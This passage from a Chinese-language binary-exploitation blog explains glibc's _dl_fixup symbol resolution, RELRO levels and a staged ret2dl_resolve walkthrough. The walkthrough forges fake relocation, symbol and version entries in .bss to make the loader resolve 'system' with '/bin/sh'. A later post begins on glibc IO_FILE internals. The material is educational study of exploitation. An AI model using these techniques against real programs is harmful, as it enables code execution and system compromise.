<h3 id="2-由dynamic节找其他各节"><a href="#2-由dynamic节找其他各节" class="headerlink" title="2.由dynamic节找其他各节"></a>2.由dynamic节找其他各节</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">symtab 	= (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">strtab 	= (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);	</span><br><span class="line">pltgot 	= (<span class="type">uintptr_t</span>) D_PTR (l, l_info[DT_PLTGOT]);		<span class="comment">//实际上_dl_fixup中没有用到</span></span><br><span class="line">reloc 	= (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset (pltgot, reloc_arg));</span><br></pre></td></tr></table></figure>

<p>这里有四个节,实际上每个节都是表</p>
<table>
<thead>
<tr>
<th>表名</th>
<th>元素类型</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>symtab符号表</td>
<td>struct Elf32_Sym</td>
<td>保存符号名在strtab中的偏移,<br />保存符号在模块中的相对地址<br />…</td>
</tr>
<tr>
<td>strtab字符串表</td>
<td>char</td>
<td>保存本模块中所有需要动态链接的符号名</td>
</tr>
<tr>
<td>pltgot过程链接表</td>
<td></td>
<td>实际上<code>_dl_fixup</code>中没有用到</td>
</tr>
<tr>
<td>jmprel重定位表</td>
<td>struct Elf32_Rel</td>
<td>保存符号的虚拟地址,<br />保存符号在符号表中的偏移</td>
</tr>
</tbody></table>
<p>symtab符号表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span><span class="comment">//符号名在strtab中的偏移</span></span><br><span class="line">  Elf32_Addr	st_value;		<span class="comment">/* Symbol value */</span>	<span class="comment">//符号在其模块中相对地址</span></span><br><span class="line">  Elf32_Word	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>jmprel重定位表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>







<h3 id="3-在本模块符号表中找到对应表项"><a href="#3-在本模块符号表中找到对应表项" class="headerlink" title="3.在本模块符号表中找到对应表项"></a>3.在本模块符号表中找到对应表项</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reloc = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset (pltgot, reloc_arg));<span class="comment">//在重定位表中的表项</span></span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];	<span class="comment">//在符号表中的表项</span></span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *refsym = sym;	<span class="comment">//副本</span></span><br><span class="line"><span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);	<span class="comment">//GOT表项地址,为后来回填做准备</span></span><br></pre></td></tr></table></figure>





<p>下面到4之前是一些检查,忽略</p>
<h3 id="4-解析符号"><a href="#4-解析符号" class="headerlink" title="4.解析符号"></a>4.解析符号</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> 	<span class="class"><span class="keyword">struct</span> <span class="title">link_map</span>* <span class="title">result</span>;</span></span><br><span class="line"> 	Elf32_Addr value;</span><br><span class="line"></span><br><span class="line">result = _dl_lookup_symbol_x (</span><br><span class="line">         strtab + sym-&gt;st_name, 		<span class="comment">//符号名字符串</span></span><br><span class="line">         l, 							<span class="comment">//本模块的link_map</span></span><br><span class="line">         &amp;sym, 						<span class="comment">//返回值,如果在其他模块找到该符号则返回其符号表项</span></span><br><span class="line">         l-&gt;l_scope,</span><br><span class="line">         version, </span><br><span class="line">         ELF_RTYPE_CLASS_PLT, </span><br><span class="line">         flags, </span><br><span class="line">         <span class="literal">NULL</span></span><br><span class="line">     );<span class="comment">//返回值result是找到符号实现所在模块的link_map</span></span><br><span class="line"></span><br><span class="line">     value = DL_FIXUP_MAKE_VALUE (</span><br><span class="line">         result,</span><br><span class="line">         SYMBOL_ADDRESS (result, sym, <span class="literal">false</span>)<span class="comment">//从link_map *result中提取目标模块基地址,加上sym.st_value偏移量得到符号虚拟地址</span></span><br><span class="line">     );</span><br></pre></td></tr></table></figure>





<h3 id="5-回填GOT表项"><a href="#5-回填GOT表项" class="headerlink" title="5.回填GOT表项"></a>5.回填GOT表项</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</span><br></pre></td></tr></table></figure>

<p>这里有一个压行,干了两个事情,</p>
<p>一是调用elf_machine_fixup_plt把value回写到rel_addr上</p>
<p>二是把value值,也就是已经解析出来的符号地址,放到eax寄存器上返回</p>
<p>注意此时是在dl_fixup中返回到dl_runtime_resolve中</p>
<p>下面的指令是这样的:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">call _dl_fixup		# Call resolver.</span><br><span class="line">popl %edx		# Get <span class="keyword">register</span> content back.</span><br><span class="line">movl (%esp), %ecx</span><br><span class="line">movl %eax, (%esp)	# Store the function address.</span><br><span class="line">movl <span class="number">4</span>(%esp), %eax</span><br><span class="line">ret $<span class="number">12</span>			# Jump to function address.</span><br></pre></td></tr></table></figure>

<p>注意到dl_runtime_resolve返回之前,栈顶是刚刚放入的eax,也就是刚解析出来的符号值</p>
<p>也就是直接 ret2目标函数 了</p>
<h2 id="ret2dl-resolve-1"><a href="#ret2dl-resolve-1" class="headerlink" title="ret2dl_resolve"></a>ret2dl_resolve</h2><p>能不能进行这种利用,得看RELRO✌的脸色</p>
<p>RELRO保护:</p>
<p>read only relocation,只读重定位</p>
<p>鉴于攻击者可以篡改GOT表,填充危险函数,因此如果GOT表是只读的,攻击者就没法写了</p>
<p>RELRO的目的是保护函数指针,防止篡改</p>
<table>
<thead>
<tr>
<th>保护程度</th>
<th>效果</th>
<th></th>
<th>编译选项</th>
</tr>
</thead>
<tbody><tr>
<td>NO_RELRO</td>
<td>dynamic段可写<br />GOT表可写,允许延迟绑定</td>
<td></td>
<td>-z norelro</td>
</tr>
<tr>
<td>PARTIAL_RELRO</td>
<td>dynamic段只读,<br />但是GOT表还是可写的,允许延迟绑定</td>
<td></td>
<td>-z lazy</td>
</tr>
<tr>
<td>FULL_RELRO</td>
<td>dynamic段只读<br />GOT表只读,不允许延迟绑定,所有符号必须在加载程序时立刻解析</td>
<td></td>
<td>-z now</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>回顾<code>_dl_fixup</code>函数解析符号的过程</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240819193758449.png" alt="image-20240819193758449"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Algorithm _dl_fixup</span><br><span class="line">Input:	a Link_Map linkmap of the Main module, an index reloc_arg of the jmprel table </span><br><span class="line">Output:	virtual address of the target symbol</span><br><span class="line"></span><br><span class="line">dynamic = linkmap.l_info</span><br><span class="line">jmprel = dynamic[DT_JMPREL]</span><br><span class="line">strtab = dynamic[DT_STRTAB]</span><br><span class="line">symtab = dynamic[DT_SYMTAB]</span><br><span class="line"></span><br><span class="line">reloc = jmprel[reloc_arg]</span><br><span class="line">sym = symtab[reloc.r_info]</span><br><span class="line">str = strtab[sym.st_name]</span><br><span class="line"></span><br><span class="line"><span class="comment">//other_linkmap是其他模块的Link_Map结构</span></span><br><span class="line"><span class="comment">//_dl_lookup_symbol_x(str)从其他模块中寻找str符号,如果找到则返回该符号与其所在的link_map</span></span><br><span class="line">[sym,other_linkmap] = _dl_lookup_symbol_x(str)</span><br><span class="line"></span><br><span class="line"><span class="comment">//link_map中保存着目标模块的基地址,sym中保存着符号相对目标模块的偏移量,加起来得到符号的虚拟地址</span></span><br><span class="line">vaddr = other_linkmap.laddr + sym.st_info</span><br></pre></td></tr></table></figure>



<h3 id="no-relro"><a href="#no-relro" class="headerlink" title="no_relro"></a>no_relro</h3><p>strtab节通常和text节加载到同一个只读段,因此在strtab上篡改函数名字符串是不可能的</p>
<p>在no_relro保护下,dynamic节可写, 可以篡改dynamic.strtab指针指向fake strtab</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240819193931068.png" alt="image-20240819193931068"></p>
<h3 id="partial-relro"><a href="#partial-relro" class="headerlink" title="partial_relro"></a>partial_relro</h3><p>在no_relro保护中，可以通过篡改dynamic节中的指针指向假的strtab伪造假的函数名</p>
<p>但是partial_relro保护使得dynamic节只读，无法篡改其中的字符串表指针</p>
<h4 id="stage1"><a href="#stage1" class="headerlink" title="stage1"></a>stage1</h4><p>由于我们需要构造“&#x2F;bin&#x2F;sh”这种字符串,要么调用read函数往内存里写,要么溢出时写进去</p>
<p>前者需要再构造read调用的rop链,并且还得给字符串找地方,找一个我们知道地址并且可写的地方,比如bss段</p>
<p>后者由于栈地址不知道在哪,需要做一个栈迁移,首先把栈搬到bss段上</p>
<p>后者更加方便,采取后者</p>
<h4 id="stage2"><a href="#stage2" class="headerlink" title="stage2"></a>stage2</h4><p>在本阶段我们构造rop链条,手动调用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dl_runtime_resolve@.GOT.PLT[0](</span><br><span class="line">	link_map=.GOT.PLT[1]</span><br><span class="line">	reloc_arg=0x20</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><strong>也就是再解析调用一下write函数,目的是验证一下,已经解析过的符号,使用rop方法能够再次触发解析过程,并且该过程是正确的</strong></p>
<h4 id="stage3"><a href="#stage3" class="headerlink" title="stage3"></a>stage3</h4><p>在本阶段我们在bss段伪造一个重定位表项, 但是该表项的内容指向正确的symtab表</p>
<p>为了使用这个假重定位表项,我们将dl_runtime_resolve的参数reloc_arg改成,该bss段假表项与真的重定位表的偏移量</p>
<p>该偏移量显然会大的离谱,远远超出重定位表的范围,因为bss和relplt段相距甚远</p>
<p><strong>此举目的是验证即使传递的reloc_arg超过重定位表范围,也没有任何安全检查阻拦,使得我们能够正确解析到符号</strong></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240819195308717.png" alt="image-20240819195308717"></p>
<h4 id="stage4"><a href="#stage4" class="headerlink" title="stage4"></a>stage4</h4><p>在本阶段我们既要构造假的重定位表项,又要构造假的符号表项</p>
<p>此时假重定位表项不再指向正确的符号,而是指向我们构造的符号</p>
<p>但是这个假符号依然索引正确的符号名称</p>
<p>显然此时reloc_arg索引重定位表的偏移量远超重定位表范围,并且假重定位项索引假符号的偏移量也远超了符号表范围</p>
<p><strong>此举目的是验证,即使符号表的索引越界,也没有任何安全检查阻拦,使得我们能够正确解析到符号</strong></p>
<p><img src="C:\Users\xidian\AppData\Roaming\Typora\typora-user-images\image-20240819193641215.png" alt="image-20240819193641215"></p>
<p>想法很好,然而在dl_runtime_resolve中,r_info不只会被用来索引符号表,还会索引versym符号版本表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)&#123;</span><br><span class="line">	  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">	  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">	  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">	    	version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240819213749275.png" alt="image-20240819213749275"></p>
<p>我们依据假符号与符号表的偏移量,计算出r_info,这保证了假重定位项可以索引假符号</p>
<p>但是不能保证r_info索引versym表的什么地方</p>
<p>实际运行时ndx&#x3D;0x442c</p>
<p>&amp;l-&gt;l_versions&#x3D;0xf7f5a710</p>
<p>然后versions表里面一项是0x10字节</p>
<p>所以version &#x3D; &amp;l-&gt;l_versions[ndx]&#x3D;0xf7f9e9d4;</p>
<p>下一条指令就要解引用了version-&gt;hash</p>
<p>然而0xf7f9e9d4上并没有在任何一个内存映射区,是一个非法地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xf7f95000</span> <span class="number">0xf7f96000</span> rw-p     <span class="number">1000</span>  <span class="number">32000</span> /usr/lib/i386-linux-gnu/ld-linux.so<span class="number">.2</span></span><br><span class="line"><span class="number">0xffb01000</span> <span class="number">0xfff59000</span> rw-p   <span class="number">458000</span>      <span class="number">0</span> [<span class="built_in">stack</span>]</span><br></pre></td></tr></table></figure>

<p>因此对非法地址解引用就段错误了</p>
<p>怎么修复这个过程呢?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">           version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">           <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">               version = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>假重定位项的r_info既索引假符号表项,又索引假versym表项</p>
<p>如果能控制假versym表项为空,则ndx就是0,此时l_versions[ndx]&#x3D;l_versions[0]就一定是合法的了</p>
<p>也就是说,我们可以微操控制一下r_info的值</p>
<p>如何控制呢?</p>
<p>原本r_info&#x3D;0x26807,其中的索引值是0x268</p>
<p>vernum基地址是0x80482d8</p>
<p>vernum[ELFW(R_SYM)(reloc-&gt;r_info)]这个假表项,在0x80482d8+0x268*2&#x3D;0x080487A8上,使用ida观察这里是.eh_frame段</p>
<p>往下翻找一个全零的假表项位置比如0x080487C2就很好</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.eh_frame:080487A8 2C                                            db  2Ch ; ,</span><br><span class="line">	...</span><br><span class="line">.eh_frame:080487C2 00                                            db    0</span><br><span class="line">.eh_frame:080487C3 00                                            db    0</span><br></pre></td></tr></table></figure>

<p>0x080487C2&#x3D;0x80482d8+index*2</p>
<p>那么index&#x3D;0x275</p>
<p>那么r_info就得是0x27507</p>
<p>注意如果只修改假的重定位项,令其r_info&#x3D;0x27507,这样就又不能正确索引到假的符号表项了</p>
<p>按下葫芦浮起瓢,因此还需要修正bss段伪造的假符号位置,在原位置基础上加一个<code>(0x275-0x268)*16</code>即可</p>
<p>乘16的原因是,符号表项一个占用16字节</p>
<h4 id="stage5"><a href="#stage5" class="headerlink" title="stage5"></a>stage5</h4><p>在本阶段,伪造假符号名字符串,并令假符号的st_name指向它,目的是证明即使st_name远超strtab范围,依然没有任何安全检查阻拦</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240820103319870.png" alt="image-20240820103319870"></p>
<h4 id="stage6"><a href="#stage6" class="headerlink" title="stage6"></a>stage6</h4><p>把stage5中的假符号名字符串改成“system”,并把write的参数(1,“&#x2F;bin&#x2F;sh”,“7”)改成system的参数(“&#x2F;bin&#x2F;sh”)</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240820111602402.png" alt="image-20240820111602402"></p>
<h2 id="在目标模块中阴暗地爬行"><a href="#在目标模块中阴暗地爬行" class="headerlink" title="在目标模块中阴暗地爬行"></a>在目标模块中阴暗地爬行</h2><p>分析了<code>_dl_fixup</code>的源码之后,已经能够理解ret2dl-resolve的原理了</p>
<p>下面的问题是,<code>_dl_fixup</code>中调用的<code>_dl_lookup_symbol_x</code>函数,是如何查找符号的呢?</p>
<p>可想而知的是,<code>glibc</code>中的符号成百上千,如果纯纯使用符号名字符串,进行模式匹配,那可真是慢了去了</p>
<p>到底怎么在目标模块中解析符号的呢?</p>
<p><a target="_blank" rel="noopener" href="https://blogs.oracle.com/solaris/post/gnu-hash-elf-sections">GNU Hash ELF Sections (oracle.com)</a></p>
<p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-223668.htm">翻译]GNU Hash ELF Sections-外文翻译-看雪-安全社区|安全招聘|kanxue.com</a></p>
<h2 id="符号解析中的哈希算法"><a href="#符号解析中的哈希算法" class="headerlink" title="符号解析中的哈希算法"></a>符号解析中的哈希算法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dl_runtime_resolve</span><br><span class="line">	_dl_fixup</span><br><span class="line">		_dl_lookup_symbol_x</span><br><span class="line">			do_lookup_x</span><br><span class="line">				do_lookup_unique</span><br><span class="line">					enter_unique_sym</span><br></pre></td></tr></table></figure>












































































      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/10/17/IO%20FILE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/17/IO%20FILE/" class="post-title-link" itemprop="url">IO_FILE</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-10-17 23:10:00" itemprop="dateCreated datePublished" datetime="2024-10-17T23:10:00+08:00">2024-10-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-10-19 23:38:59" itemprop="dateModified" datetime="2024-10-19T23:38:59+08:00">2024-10-19</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="IO FILE"></a>IO FILE</h1><p>FILE,fopen,fread等函数是glibc为c读写文件准备的数据结构和函数</p>
<blockquote>
<p>linux操作系统也提供了<code>open</code>,<code>read</code>等一系列文件操作函数</p>
<p>两者的区别是,linux这一套系统调用基于文件描述符<code>fd</code>,</p>
<p>但是glibc文件io这一套基于文件指针<code>_IO_FILE*</code>,指向一个<code>FILE</code>对象,这个对象中包装着文件描述符<code>fd</code></p>
</blockquote>
<h2 id="datastructure"><a href="#datastructure" class="headerlink" title="datastructure"></a>datastructure</h2><p>FILE相关的声明在</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">glibc2.27/libio/libioP.h</span><br><span class="line">glibc2.27/libio/bits/libio.h</span><br></pre></td></tr></table></figure>

<p><code>FILE</code>实际上是<code>_IO_FILE</code>的别名,</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ptype/ox <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">/* <span class="title">offset</span>      |    <span class="title">size</span> */  <span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line"><span class="comment">/* 0x0000      |  0x0004 */</span>    <span class="type">int</span> _flags;</span><br><span class="line"><span class="comment">/* XXX  4-byte hole      */</span></span><br><span class="line"><span class="comment">/* 0x0008      |  0x0008 */</span>    <span class="type">char</span> *_IO_read_ptr;</span><br><span class="line"><span class="comment">/* 0x0010      |  0x0008 */</span>    <span class="type">char</span> *_IO_read_end;</span><br><span class="line"><span class="comment">/* 0x0018      |  0x0008 */</span>    <span class="type">char</span> *_IO_read_base;</span><br><span class="line"><span class="comment">/* 0x0020      |  0x0008 */</span>    <span class="type">char</span> *_IO_write_base;</span><br><span class="line"><span class="comment">/* 0x0028      |  0x0008 */</span>    <span class="type">char</span> *_IO_write_ptr;</span><br><span class="line"><span class="comment">/* 0x0030      |  0x0008 */</span>    <span class="type">char</span> *_IO_write_end;</span><br><span class="line"><span class="comment">/* 0x0038      |  0x0008 */</span>    <span class="type">char</span> *_IO_buf_base;</span><br><span class="line"><span class="comment">/* 0x0040      |  0x0008 */</span>    <span class="type">char</span> *_IO_buf_end;</span><br><span class="line"><span class="comment">/* 0x0048      |  0x0008 */</span>    <span class="type">char</span> *_IO_save_base;</span><br><span class="line"><span class="comment">/* 0x0050      |  0x0008 */</span>    <span class="type">char</span> *_IO_backup_base;</span><br><span class="line"><span class="comment">/* 0x0058      |  0x0008 */</span>    <span class="type">char</span> *_IO_save_end;</span><br><span class="line"><span class="comment">/* 0x0060      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"><span class="comment">/* 0x0068      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"><span class="comment">/* 0x0070      |  0x0004 */</span>    <span class="type">int</span> _fileno;</span><br><span class="line"><span class="comment">/* 0x0074      |  0x0004 */</span>    <span class="type">int</span> _flags2;</span><br><span class="line"><span class="comment">/* 0x0078      |  0x0008 */</span>    <span class="type">__off_t</span> _old_offset;</span><br><span class="line"><span class="comment">/* 0x0080      |  0x0002 */</span>    <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line"><span class="comment">/* 0x0082      |  0x0001 */</span>    <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line"><span class="comment">/* 0x0083      |  0x0001 */</span>    <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"><span class="comment">/* XXX  4-byte hole      */</span></span><br><span class="line"><span class="comment">/* 0x0088      |  0x0008 */</span>    _IO_lock_t *_lock;</span><br><span class="line"><span class="comment">/* 0x0090      |  0x0008 */</span>    <span class="type">__off64_t</span> _offset;</span><br><span class="line"><span class="comment">/* 0x0098      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line"><span class="comment">/* 0x00a0      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line"><span class="comment">/* 0x00a8      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line"><span class="comment">/* 0x00b0      |  0x0008 */</span>    <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="comment">/* 0x00b8      |  0x0008 */</span>    <span class="type">size_t</span> __pad5;</span><br><span class="line"><span class="comment">/* 0x00c0      |  0x0004 */</span>    <span class="type">int</span> _mode;</span><br><span class="line"><span class="comment">/* 0x00c4      |  0x0014 */</span>    <span class="type">char</span> _unused2[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):  216 */</span></span><br><span class="line">                             &#125;</span><br></pre></td></tr></table></figure>

<p>在<code>x86_64</code>上,<code>FILE</code>结构体大小为<code>0xd8</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  p <span class="title function_">sizeof</span><span class="params">(FILE)</span></span><br><span class="line">$5 = <span class="number">0xd8</span></span><br></pre></td></tr></table></figure>

<p>在glibc中保存了一个全局指针<code>_IO_list_all</code></p>
<p>它指向程序第一个<code>IO_FILE</code>结构体,也就是<code>stderr</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gef➤  ptype _IO_list_all</span><br><span class="line">type = <span class="keyword">struct</span> _IO_FILE_plus &#123;</span><br><span class="line">    _IO_FILE file;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125; *</span><br><span class="line">gef➤  p &amp;_IO_list_all</span><br><span class="line">$<span class="number">7</span> = (<span class="keyword">struct</span> _IO_FILE_plus **) <span class="number">0x7ffff7dd3660</span> &lt;__GI__IO_list_all&gt;</span><br><span class="line">gef➤  p _IO_list_all</span><br><span class="line">$<span class="number">8</span> = (<span class="keyword">struct</span> _IO_FILE_plus *) <span class="number">0x7ffff7dd3680</span> &lt;_IO_2_1_stderr_&gt;</span><br></pre></td></tr></table></figure>

<p>实际上打印其类型时发现并不是一个<code>_IO_FILE</code>,而是一个<code>_IO_FILE_plus</code>,这两者是包含关系</p>
